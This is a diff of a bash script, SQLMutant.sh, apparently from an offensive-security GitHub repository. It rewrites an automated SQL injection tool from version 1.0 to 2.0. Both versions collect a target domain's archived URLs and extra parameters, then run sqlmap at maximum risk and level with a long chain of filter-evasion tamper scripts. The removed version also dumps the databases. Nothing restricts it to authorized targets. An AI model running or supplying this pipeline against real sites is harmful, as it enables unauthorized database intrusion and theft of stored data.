@@ -1,181 +1,242 @@
 #!/bin/bash
-curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
-echo ""
-# Generate a random Sun Tzu quote for offensive security
-# Array of Sun Tzu quotes
-quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
-# Get a random quote from the array
-random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
 
-echo "We have some housekeeping to take care of first! "
+# SQLMutant.sh - Automated SQL Injection Testing Tool
+# Version: 2.0
+# Author: Chris 'SaintDruG' Abou-Chabké
+# GitHub: https://github.com/blackhatethicalhacking/SQLMutant
+# Description: Automated tool for discovering and testing SQL injection vulnerabilities.
 
-# Function to install packages
-install_package() {
-  package_name=$1
-  echo "$package_name not found, installing..."
-  if command -v dnf > /dev/null; then
-    sudo dnf install -y "$package_name"
-  elif command -v yum > /dev/null; then
-    sudo yum install -y "$package_name"
-  elif command -v apt-get > /dev/null; then
-    sudo apt-get install -y "$package_name"
-  else
-    echo "Error: package manager not found, please install $package_name manually"
+set -e  # Exit immediately if a command exits with a non-zero status
+trap 'echo "An error occurred. Exiting..."; deactivate_virtualenv; exit 1;' ERR
+
+#######################
+# Function Definitions
+#######################
+
+# Display usage instructions
+usage() {
+    echo "Usage: $0 -d domain [-t threads] [-p proxy] [-a auth_token] [-h]"
+    echo "  -d domain       Target domain to scan (e.g., example.com)"
+    echo "  -t threads      Number of threads to use (default: 10)"
+    echo "  -p proxy        Proxy server (e.g., http://proxyserver:port)"
+    echo "  -a auth_token   Authentication token for protected sites"
+    echo "  -h              Display this help message"
     exit 1
-  fi
 }
 
-# Install dependencies
-declare -a dependencies=("lolcat" "figlet" "curl" "toilet")
-for dependency in "${dependencies[@]}"
-do
-  if ! command -v "$dependency" > /dev/null; then
-    install_package "$dependency"
-  fi
+# Install missing packages
+install_package() {
+    package_name=$1
+    echo "$package_name not found. Attempting to install..."
+    if command -v apt-get > /dev/null; then
+        sudo apt-get update && sudo apt-get install -y "$package_name"
+    elif command -v yum > /dev/null; then
+        sudo yum install -y "$package_name"
+    elif command -v dnf > /dev/null; then
+        sudo dnf install -y "$package_name"
+    else
+        echo "Package manager not found or unsupported. Please install $package_name manually."
+        exit 1
+    fi
+}
+
+# Check and install dependencies
+check_dependencies() {
+    dependencies=("lolcat" "figlet" "curl" "toilet" "virtualenv" "jq" "wget" "go" "pip3" "git" "python3")
+    for dep in "${dependencies[@]}"; do
+        if ! command -v "$dep" > /dev/null; then
+            install_package "$dep"
+        fi
+    done
+}
+
+# Set up Python virtual environment
+setup_virtualenv() {
+    echo "Setting up Python virtual environment..."
+    if ! command -v virtualenv > /dev/null; then
+        echo "virtualenv not found, installing..."
+        sudo pip3 install virtualenv
+    fi
+    virtualenv venv
+    source venv/bin/activate
+    pip install --upgrade pip
+    pip install arjun uro httpx[cli]
+}
+
+# Deactivate Python virtual environment
+deactivate_virtualenv() {
+    if [[ "$VIRTUAL_ENV" != "" ]]; then
+        deactivate
+    fi
+}
+
+# Install Go tools
+install_go_tools() {
+    echo "Installing Go tools..."
+    export GO111MODULE=on
+    if [ ! -d "$HOME/go/bin" ]; then
+        mkdir -p "$HOME/go/bin"
+    fi
+    export PATH="$PATH:$HOME/go/bin"
+    go install github.com/tomnomnom/waybackurls@latest
+    go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+}
+
+# Display the ASCII art banner
+display_banner() {
+    curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
+    echo ""
+    figlet -w 80 -f small SQLMutant | lolcat
+    echo ""
+    echo "[YOU ARE USING SQLMutant.sh] - (v2.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
+    echo ""
+}
+
+# Generate a random Sun Tzu quote
+generate_quote() {
+    quotes=("The supreme art of war is to subdue the enemy without fighting."
+            "All warfare is based on deception."
+            "He who knows when he can fight and when he cannot, will be victorious."
+            "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent."
+            "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
+    random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
+    echo "Offensive Security Tip: $random_quote - Sun Tzu" | lolcat
+}
+
+# Check for internet connectivity
+check_internet() {
+    echo "Checking for internet connectivity..." | lolcat
+    wget -q --spider https://google.com
+    if [ $? -ne 0 ]; then
+        echo "No internet connection detected. Please connect to the internet before running SQLMutant.sh!" | lolcat
+        exit 1
+    fi
+    echo "Internet connection detected. Proceeding..." | lolcat
+}
+
+# Validate domain input
+validate_domain() {
+    if [[ ! "$domain" =~ ^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$ ]]; then
+        echo "Invalid domain format: $domain"
+        exit 1
+    fi
+}
+
+# Fetch and filter URLs
+fetch_and_filter_urls() {
+    echo "Creating directory for output files..." | lolcat
+    mkdir -p "$domain"
+    LOGFILE="$domain/sqlmutant.log"
+    echo "Fetching URLs from Wayback Machine..." | lolcat
+    waybackurls "$domain" | uro | tee "$domain/all_urls.txt"
+    echo "Filtering URLs with parameters..." | lolcat
+    grep -iE '\?' "$domain/all_urls.txt" > "$domain/urls_with_params.txt"
+}
+
+# Find additional parameters with Arjun
+find_additional_params() {
+    echo "Finding additional parameters using Arjun..." | lolcat
+    arjun -i "$domain/all_urls.txt" -t "$threads" --disable-redirects -oJ "$domain/arjun_output.json"
+    if [ -f "$domain/arjun_output.json" ]; then
+        cat "$domain/arjun_output.json" | jq -r '.[] | select(.params != null) | .url' > "$domain/arjun_urls.txt"
+    else
+        touch "$domain/arjun_urls.txt"
+    fi
+}
+
+# Merge URLs and prepare for SQLMap
+prepare_sqlmap_input() {
+    echo "Merging URLs for SQLMap testing..." | lolcat
+    cat "$domain/urls_with_params.txt" "$domain/arjun_urls.txt" | uro | sort -u > "$domain/sqlmap_input.txt"
+    num_sql_urls=$(wc -l "$domain/sqlmap_input.txt" | awk '{print $1}')
+    echo "Found $num_sql_urls URLs ready for SQL injection testing." | lolcat
+}
+
+# Run SQLMap
+run_sqlmap() {
+    echo "Running SQLMap with aggressive settings..." | lolcat
+    sqlmap -m "$domain/sqlmap_input.txt" \
+        --batch \
+        --random-agent \
+        --level=5 \
+        --risk=3 \
+        --threads="$threads" \
+        --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes \
+        --skip-urlencode \
+        --forms \
+        --smart \
+        --output-dir="$domain/sqlmap_output" \
+        $sqlmap_options
+}
+
+# Display final messages
+display_final_messages() {
+    echo "SQLMap scanning completed. Please review the results in $domain/sqlmap_output" | lolcat
+    echo -e "\nThank you for using SQLMutant by SaintDruG!" | lolcat
+}
+
+# Cleanup function
+cleanup() {
+    deactivate_virtualenv
+    echo "Cleanup completed."
+}
+
+#######################
+# Main Execution Flow
+#######################
+
+# Parse command-line arguments
+threads=10  # Default number of threads
+while getopts ":d:t:p:a:h" opt; do
+    case $opt in
+        d) domain="$OPTARG" ;;
+        t) threads="$OPTARG" ;;
+        p) proxy="$OPTARG" ;;
+        a) auth_token="$OPTARG" ;;
+        h) usage ;;
+        *) usage ;;
+    esac
 done
 
-echo "All dependencies installed successfully"
-
-echo "Got a few more packages to install . . . "
-
-# Install waybackurls
-go install github.com/tomnomnom/waybackurls@latest
-echo "waybackurls is now installed"
-
-# Install Arjun
-echo "Installing Arjun now"
-pip3 install arjun
-echo "Arjun has been installed"
-cd ..
-
-# Install sqlmap
-echo "Installing sqlmap now"
-git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
-echo "sqlmap has been installed"
-
-echo "installing httpx now"
-go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
-sudo cp $HOME/go/bin/httpx /usr/local/bin
-echo "httpx has been installed "
-
-# Install httpx[cli]
-echo "Installing httpx[cli]..."
-if ! command -v httpx > /dev/null; then
-  echo "httpx not found, installing..."
-  if command -v pip3 > /dev/null; then
-    sudo pip3 install httpx[cli]
-  elif command -v pip > /dev/null; then
-    sudo pip install httpx[cli]
-  else
-    echo "Error: package manager not found, please install httpx[cli] manually"
-    exit 1
-  fi
-fi
-echo "httpx[cli] installed successfully."
-
-echo "Installing uro..."
-pip3 install uro
-echo "uro has been installed."
-
-echo "All packages installed successfully"
-echo "ShadowDev wuz here . . "
-
-# Print the quote
-echo "Offensive Security Tip: $random_quote - Sun Tzu" | lolcat
-sleep 1
-echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
-sleep 1
-figlet -w 80 -f small SQLMutant | lolcat
-echo ""
-echo "[YOUR ARE USING SQLMutant.sh] - (v1.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
-sleep 1
-#check if the user is connected to the internet
-tput bold;echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
-# Check connection
-wget -q --spider https://google.com
-if [ $? -ne 0 ];then
-    echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING SQLMutant.sh!" | lolcat
-    exit 1
-fi
-tput bold;echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat
-
-# Get domain from user input
-echo "Please enter the domain to scan (e.g. example.com):" | lolcat
-read domain
-
-# Create a directory for the output files
-echo "Creating directory for output files..." | lolcat
-mkdir "$domain"
-sleep 1
-# Get URLs from Wayback Machine and filter them using HTTPX
-echo -e "Fetching URLs from Wayback Machine and \e[91madvanced\e[0m Regex Filtering using HTTPX..." | lolcat
-waybackurls "$domain" | uro | httpx -verbose | tee "$domain/all_urls.txt" | grep -iE '(\?|\=|\&)(id|select|update|union|from|where|insert|delete|into|information_schema)' | sort -u > "$domain/sql_ready_urls.txt"
-cat "$domain/all_urls.txt" | grep -iE '\?' > "$domain/all_urls_withparams.txt"
-# Inform user about the number of URLs found
-num_urls=$(wc -l "$domain/all_urls.txt" | cut -d ' ' -f 1)
-echo -e "Found $num_urls URLs for $domain \e[91mbefore\e[0m applying the \e[92mMagic Regex Patterns\e[0m" | lolcat
-sleep 5  # Pause for 5 seconds
-
-# Inform user about the number of URLs ready for SQL injection testing
-num_sql_urls=$(wc -l "$domain/all_urls_withparams.txt" | cut -d ' ' -f 1)
-echo -e "Found $num_sql_urls URLs ready for SQL injection \e[91mafter\e[0m applying the \e[92mMagic Regex Patterns\e[0m $domain." | lolcat
-sleep 5  # Pause for 5 seconds
-# Run Arjun with 20 threads to find more parameters
-echo -e "Finding \e[91mmore\e[0m parameters using Arjun with 20 threads..." | lolcat
-arjun -i "$domain/all_urls.txt" -t 20 --disable-redirects -oJ "$domain/arjun_output.json" 
-
-# Extract URLs with parameters from Arjun's output
-if [ -f "$domain/arjun_output.json" ]; then
-  cat "$domain/arjun_output.json" | jq -r '.[] | select(.params != null) | .url' > "$domain/arjun_urls.txt"
-else
-  touch "$domain/arjun_urls.txt"
+# Check if domain is provided
+if [ -z "$domain" ]; then
+    usage
 fi
 
-# Merge the URLs found by Arjun with the ones ready for SQL injection
-echo "Merging Arjun and Wayback URLs with Magic..." | lolcat
-if test -f "$domain/arjun_urls.txt"; then cat "$domain/sql_ready_urls.txt" "$domain/arjun_urls.txt" "$domain/all_urls.txt" "$domain/all_urls_withparams.txt" | uro | sort -u > "$domain/sql_ready_urls2.txt"; else cat "$domain/sql_ready_urls.txt" > "$domain/sql_ready_urls2.txt"; fi
+# Start of the script execution
+display_banner
+generate_quote
+check_internet
+validate_domain
+check_dependencies
+setup_virtualenv
+install_go_tools
 
-# Inform user about the new number of URLs ready for SQL injection testing
-num_sql_urls2=$(wc -l "$domain/sql_ready_urls2.txt" | cut -d ' ' -f 1)
-echo -e "Found $num_sql_urls2 URLs \e[91mready\e[0m for SQL injection testing for $domain after using Arjun and Mixing all results..."
-sleep 5  # Pause for 5 seconds
-# Test SQL injection on the new list of URLs using SQLMAP
-echo -e "Testing SQL injection on the new list of URLs using SQLMAP with a Tweaked \e[91mAgressive\e[0m Approach, Let's go!..." | lolcat
-sqlmap -m "$domain/sql_ready_urls2.txt" --risk=3 --smart --hpp --level=5 --random-agent --threads=10 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --skip-urlencode --string "saintdrugis1337" --forms --dump --dbms=mysql --batch
-echo "Make sure to examine the results \e[91mmanually\e[0m in the location where it saves all the results: /root/.local/share/sqlmap/output/" | lolcat
-sleep 3
-echo -e "\n\033[1;32mThis tool comes with amazing AI-created photos that were done during coding this. \033[0m"
-echo -e "\033[1;32mA lot of hours were spent on optimizing this massive SQL command and the flow. \033[0m"
-echo -e "\033[1;32mFeel free to check it out on our GitHub repo! \033[0m"
+# Set proxy if provided
+if [ -n "$proxy" ]; then
+    export http_proxy="$proxy"
+    export https_proxy="$proxy"
+    echo "Proxy set to $proxy" | lolcat
+fi
 
-echo -e "\n\033[1;34m--------------------------------------------\033[0m"
+# Set authentication token if provided
+if [ -n "$auth_token" ]; then
+    auth_header="Authorization: Bearer $auth_token"
+    echo "Authentication token set." | lolcat
+fi
 
-echo -e "\033[1;36mYou can view the wallpapers that inspired us during the creation of this tool on our GitHub repo: \033[0m"
-echo -e "\033[1;33mIn Your Directory: SQLMutant/WallPapers Imag1nations creating this tool \033[0m"
+# Fetch and process URLs
+fetch_and_filter_urls
+find_additional_params
+prepare_sqlmap_input
 
-echo -e "\033[1;34m--------------------------------------------\033[0m\n"
+# Run SQLMap with error handling
+run_sqlmap
 
-echo -e "\033[1;32mThank you for using SQLMutant by SaintDruG! \033[0m"
-# Matrix effect
-echo "Entering the Matrix for 5 seconds:" | toilet --metal -f term -F border
+# Display final messages
+display_final_messages
 
+# Cleanup and exit
+cleanup
 
-R='\033[0;31m'
-G='\033[0;32m'
-Y='\033[1;33m'
-B='\033[0;34m'
-P='\033[0;35m'
-C='\033[0;36m'
-W='\033[1;37m'
-
-for ((i=0; i<5; i++)); do
-    echo -ne "${R}10 ${G}01 ${Y}11 ${B}00 ${P}01 ${C}10 ${W}00 ${G}11 ${P}01 ${B}10 ${Y}11 ${C}00\r"
-    sleep 0.2
-    echo -ne "${R}01 ${G}10 ${Y}00 ${B}11 ${P}10 ${C}01 ${W}11 ${G}00 ${P}10 ${B}01 ${Y}00 ${C}11\r"
-    sleep 0.2
-    echo -ne "${R}11 ${G}00 ${Y}10 ${B}01 ${P}00 ${C}11 ${W}01 ${G}10 ${P}00 ${B}11 ${Y}10 ${C}01\r"
-    sleep 0.2
-    echo -ne "${R}00 ${G}11 ${Y}01 ${B}10 ${P}11 ${C}00 ${W}10 ${G}01 ${P}11 ${B}00 ${Y}01 ${C}10\r"
-    sleep 0.2
-done
-
+exit 0
